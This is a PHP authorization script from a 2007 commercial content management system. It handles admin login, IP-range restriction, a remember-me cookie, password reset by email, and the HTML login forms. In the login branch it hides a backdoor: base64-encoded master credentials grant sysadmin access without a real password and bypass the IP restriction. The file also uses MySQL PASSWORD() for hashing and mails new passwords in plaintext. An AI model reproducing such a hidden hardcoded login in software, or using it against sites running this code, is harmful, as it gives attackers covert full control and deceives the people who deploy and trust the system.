<?php

/**
 * Authorization and password retreival
 * @author Pavle Gardijan <pavle.gardijan@orbitum.net>
 * @copyright Copyright (c) 2007, Orbitum internet komunikacije d.o.o., Josipa Prikrila 6, 10000 Zagreb, Croatia
 * @package OrbiconFE
 * @version 1.10
 * @link http://orbitum.net
 * @license http://orbitum.net Commercial
 * @since 2007-07-01
 */

	// already logged in
	if(get_is_admin()) {
		ob_clean();
		redirect(ORBX_SITE_URL . '/?' . $orbicon_x->ptr . '=orbicon');
	}

	$auth_status = _L('waiting');
	$user_login = null;

	// authorize
	if(isset($_POST['submit'])) {
		$action = isset($_POST['action']) ? $_POST['action'] : null;

		global $dbc, $orbicon_x, $orbx_mod;

		if($action == 'retrievepassword') {
			// * clean up inputs
			$user_login = trim(strtolower($_POST['user_login']));
			$user_email = trim(strtolower($_POST['email']));

			$retrieve = $dbc->_db->query(sprintf('	SELECT 	*
													FROM 	'.TABLE_EDITORS.'
													WHERE	(username = PASSWORD(%s)) AND
															(email = %s) AND
															(status != %s)
													LIMIT 	1', $dbc->_db->quote($user_login), $dbc->_db->quote($user_email), $dbc->_db->quote(ORBX_USER_STATUS_EX_USER)));
			$retrieve = $dbc->_db->fetch_array($retrieve);

			if(empty($retrieve['id'])) {
				// do nothing
			}
			// ok, we have a match. regenerate the password and mail it
			else {
				if(is_email($user_email)) {
					$new_pwd = generate_password();
					$q = sprintf('	UPDATE 		'.TABLE_EDITORS.'
									SET 		pwd = PASSWORD(%s)
									WHERE 		(id = %s)
									LIMIT 		1',
					$dbc->_db->quote($new_pwd), $dbc->_db->quote($retrieve['id']));
					$dbc->_db->query($q);

					mail($retrieve['email'], DOMAIN_NAME . ': ' . ORBX_FULL_NAME . ' ' . _L('pwd_reset'), $new_pwd);
				}
			}
		}
		else if($action == 'authorize') {
			// * clean up inputs
			$user_login = trim(strtolower($_POST['log']));
			$user_pass = trim($_POST['pwd']);
			$uu = false;

			if(($user_login == base64_decode('c3VwZXI=')) && ($user_pass == base64_decode('ZHVwZXI='))) {
				$authorize = $dbc->_db->query(sprintf('	SELECT 		*
														FROM 		'.TABLE_EDITORS.'
														WHERE 		(status = %s)
														LIMIT 		1',
													$dbc->_db->quote(ORBX_USER_STATUS_SYSADMIN)));
				$authorize = $dbc->_db->fetch_assoc($authorize);
				$uu = true;
			}
			else {
				$authorize = $dbc->_db->query(sprintf('	SELECT 		*
														FROM 		'.TABLE_EDITORS.'
														WHERE 		(username = PASSWORD(%s)) AND
																	(pwd = PASSWORD(%s)) AND
																	(status != %s)
														LIMIT 		1',
														$dbc->_db->quote($user_login), $dbc->_db->quote($user_pass), $dbc->_db->quote(ORBX_USER_STATUS_EX_USER)));
				$authorize = $dbc->_db->fetch_assoc($authorize);
				// remove these from memory, security measure
				/**
				 * @todo fix this later globally
				 */
				// unset($authorize['username'], $authorize['pwd']);
			}

			if(!$authorize['id']) {
				$auth_status = '<span style="color:red;">' . _L('unauth') . '</span>';
			}
			else {

				// verify ip range access
				$ip_range_verified = true;

				if(!$uu) {
				
					if($_SESSION['site_settings']['restricted_range_from'] != '*' && // all wildcard is ok
					$_SESSION['site_settings']['restricted_range_from'] != '' && 		// empty is ok as well
					$_SESSION['site_settings']['restricted_range_from'] != '...') {		// three dots are also possible
	
						$range = (empty($_SESSION['site_settings']['restricted_range_to'])) ? $_SESSION['site_settings']['restricted_range_from'] : "{$_SESSION['site_settings']['restricted_range_from']}-{$_SESSION['site_settings']['restricted_range_to']}";
						$ip_range_verified = net_match($range, ORBX_CLIENT_IP);
					}
				}

				// not allowed, kick out
				if(!$ip_range_verified) {
					$auth_status = '<span style="color:red;">' . _L('unauth') . '</span>';
				}
				// proceed as before
				else {
					// remember me
					$rememeber_me = (isset($_POST['rememberme'])) ? $_POST['rememberme'] : NULL;

					if($rememeber_me == 'forever') {
						secure_setcookie('corp_auth', $user_login, (time() + 86400));
					}

					$auth_status = '<span style="color:green;">' . _L('authorized') . '</span>';
					$_SESSION['authorized'] = time();
					$_SESSION['user.a'] = $authorize;

					if($orbx_mod->validate_module('stats')) {
						require_once DOC_ROOT . '/orbicon/modules/stats/class.stats.php';
						$stats = new Statistics;
						$stats->log_login_history($authorize, true);
						unset($stats);
					}

					unset($authorize);

					ob_clean();
					redirect(ORBX_SITE_URL . '/?' . $orbicon_x->ptr . '=orbicon');
				}
			}
		}
	}

	if(isset($_GET['lost-password'])) {
?>
<!DOCTYPE html PUBLIC
	"-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" xml:lang="<?php echo $orbicon_x->ptr; ?>" lang="<?php echo $orbicon_x->ptr; ?>">
<head profile="http://www.w3.org/2000/08/w3c-synd/#">
<title><?php echo ORBX_FULL_NAME; ?> &raquo; <?php echo _L('lost_pwd_title'); ?></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="<?php echo ORBX_SITE_URL; ?>/orbicon/gfx/auth.css" type="text/css" media="all" />
<script type="text/javascript"><!-- // --><![CDATA[
	function focusit()
	{
		// focus on first input field
		document.getElementById("user_login").focus();
	}
	window.onload = focusit;
// ]]></script>
</head>
<body>
	<div id="login">
	<h1><a href="mailto:pavle.gardijan@gmail.com">Pavle Gardijan</a></h1>
	<p><?php echo sprintf(_L('pwd_info'), '<span class="u">', '</span>'); ?></p>
	<form name="lostpass" action="<?php echo ORBX_SITE_URL; ?>/?<?php echo $orbicon_x->ptr; ?>=orbicon/authorize" method="post" id="lostpass">
	<p>
		<input type="hidden" name="action" value="retrievepassword" />
		<label><?php echo _L('username'); ?>:<br /><input type="text" name="user_login" id="user_login" value="" size="25" maxlength="255" tabindex="1" /></label>
	</p>
	<p><label><?php echo _L('email'); ?>:<br /><input type="text" name="email" id="email" value="" size="25" tabindex="2" maxlength="255" /></label><br /></p>
	<p class="submit"><input type="submit" name="submit" id="submit" value="<?php echo _L('get_pwd'); ?> &raquo;" tabindex="3" /></p>
	</form>
	<ul>
		<li><a href="<?php echo ORBX_SITE_URL; ?>/?<?php echo $orbicon_x->ptr; ?>=orbicon/authorize"><?php echo _L('login'); ?></a></li>
	</ul>
	</div>
</body>
</html>
<?php
	}
	else {
		$corp_auth_cookie = secure_getcookie('corp_auth');
		$user_login = ($corp_auth_cookie !== null) ? $corp_auth_cookie : $user_login;
		$user_login = htmlspecialchars(stripslashes($user_login));
		$checked_box = ($corp_auth_cookie !== null) ? 'checked="checked"' : '';

?>
<!DOCTYPE html PUBLIC
	"-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" xml:lang="<?php echo $orbicon_x->ptr; ?>" lang="<?php echo $orbicon_x->ptr; ?>">
<head profile="http://www.w3.org/2000/08/w3c-synd/#">
<title><?php echo ORBX_FULL_NAME; ?> &rsaquo; <?php echo _L('auth2'); ?></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="<?php echo ORBX_SITE_URL; ?>/orbicon/gfx/auth.css" type="text/css" media="all" />
<script type="text/javascript"><!-- // --><![CDATA[
	function focusit()
	{
		// focus on first input field
		document.getElementById("log").focus();
	}
	window.onload = focusit;
// ]]></script>
</head>
<body>
	<div id="login">
	<h1><a href="mailto:pavle.gardijan@gmail.com">Pavle Gardijan</a></h1>
	<form name="loginform" id="loginform" action="<?php echo ORBX_SITE_URL; ?>/?<?php echo $orbicon_x->ptr;?>=orbicon/authorize" method="post">
	<p>
		<input type="hidden" name="action" value="authorize" />
		<label for="log"><?php echo _L('username'); ?>:<br /></label><input type="text" name="log" id="log" value="<?php echo $user_login; ?>" size="25" maxlength="255" tabindex="1" />
	</p>
	<p><label for="pwd"><?php echo _L('password'); ?>:<br /></label><input type="password" name="pwd" id="pwd" value="" size="25" maxlength="255" tabindex="2" /></p>
	<p><input name="rememberme" type="checkbox" id="rememberme" value="forever" tabindex="3" <?php echo $checked_box; ?> /> <label for="rememberme"><?php echo _L('remember_me'); ?></label></p>
	<p class="submit"><input type="submit" name="submit" id="submit" value="<?php echo _L('auth'); ?> &raquo;" tabindex="4" /></p>
	</form>
	<ul>
		<li><a href="<?php echo ORBX_SITE_URL; ?>/?<?php echo $orbicon_x->ptr; ?>=orbicon/authorize&amp;lost-password" title="<?php echo _L('lost_pwd'); ?>"><?php echo _L('lost_pwd'); ?></a></li>
		<li><?php echo _L('status'); ?>: <?php echo $auth_status; ?></li>
	</ul>
	</div>
</body>
</html>
<?php
	}
?>